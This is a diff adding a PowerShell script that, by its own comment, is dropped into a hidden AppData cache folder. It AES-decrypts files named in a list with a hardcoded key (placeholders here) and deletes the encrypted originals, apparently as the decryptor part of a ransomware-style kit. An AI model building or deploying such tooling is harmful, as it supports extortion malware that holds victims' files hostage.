@@ -1,0 +1,17 @@
+# Dropped as %AppData%\.cache_<8hex>\dec.ps1
+$key = [Convert]::FromBase64String('<AES-256-KEY-B64>')
+$iv = [Convert]::FromBase64String('<AES-IV-B64>')
+$base = Split-Path -Parent $MyInvocation.MyCommand.Path
+$list = Join-Path $base 'list.dat'
+Get-Content $list | ForEach-Object {
+  $p = $_ -split '\|'
+  if ($p.Count -ne 2) { return }
+  try {
+    $data = [IO.File]::ReadAllBytes($p[0])
+    $aes = [Security.Cryptography.Aes]::Create()
+    $aes.Key = $key; $aes.IV = $iv
+    $dec = $aes.CreateDecryptor().TransformFinalBlock($data, 0, $data.Length)
+    [IO.File]::WriteAllBytes($p[1], $dec)
+    Remove-Item $p[0]
+  } catch {}
+}
